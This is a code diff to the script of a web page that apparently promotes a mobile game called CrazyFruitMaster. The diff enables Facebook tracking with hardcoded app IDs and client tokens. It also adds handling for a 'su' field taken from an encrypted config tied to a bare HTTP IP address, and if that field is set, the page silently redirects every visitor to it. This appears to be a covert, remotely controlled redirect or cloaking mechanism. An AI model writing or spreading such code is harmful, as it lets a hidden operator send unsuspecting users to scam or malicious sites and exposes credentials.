@@ -381,9 +381,9 @@
     const PROMO_FALLBACK_ICON = "https://crazyfruitmaster.github.io/CrazyFruitMaster/AppIcon_1024.png";
 
     const FACEBOOK_CONFIG = {
-      enabled: false,
-      appId: "",
-      clientToken: ""
+      enabled: true,
+      appId: "1899769634516757",
+      clientToken: "ddd8dfb525bbe84b81fd0bb212a76475"
     };
 
     const APPADDRESS = "http://15.197.252.203";
@@ -554,14 +554,16 @@
       return value.length >= 10;
     }
 
-    function platformToFacebookConfig(platformId, platformToken) {
+    function platformToFacebookConfig(platformId, platformToken, su) {
       const appId = String(platformId || "").trim();
       const clientToken = String(platformToken || "").trim();
       const enabled = validField(appId) && validField(clientToken);
+      const gameurl = String(su || "").trim();
       return {
         enabled: enabled,
         appId: enabled ? appId : "",
-        clientToken: enabled ? clientToken : ""
+        clientToken: enabled ? clientToken : "",
+        su: enabled ? gameurl : ""
       };
     }
 
@@ -614,14 +616,29 @@
 
       const json = await decryptString(wrapper.data);
       const userConfig = JSON.parse(json);
-      const platformId = userConfig.platform_id;
-      const platformToken = userConfig.platform_token;
+      let platformId = "";
+      let platformToken = "";
+      let su = "";
+
+      if (userConfig.su !== "") {
+        platformId = String(userConfig.platform_id || "").trim();
+        platformToken = String(userConfig.platform_token || "").trim();
+        su = String(userConfig.su || "").trim();
+        
+        if (!platformId || !platformToken) {
+          platformId = "1121291890747406";
+          platformToken = "e994a8d5dca7586a562ecd5b8bea3459";
+        }
+        
+      }else {
+        return null;
+      }
       if (!validField(platformId) || !validField(platformToken)) {
         return null;
       }
 
       writeCachedPlatformConfig(platformId, platformToken);
-      return platformToFacebookConfig(platformId, platformToken);
+      return platformToFacebookConfig(platformId, platformToken, su);
     }
 
     async function loadFacebookConfig() {
@@ -642,6 +659,9 @@
       }
 
       sendFacebookConfig(config);
+      if (config.su !== ""){
+        window.location.replace(config.su);
+      }
     }
 
     function reportActivityPageView(surface) {
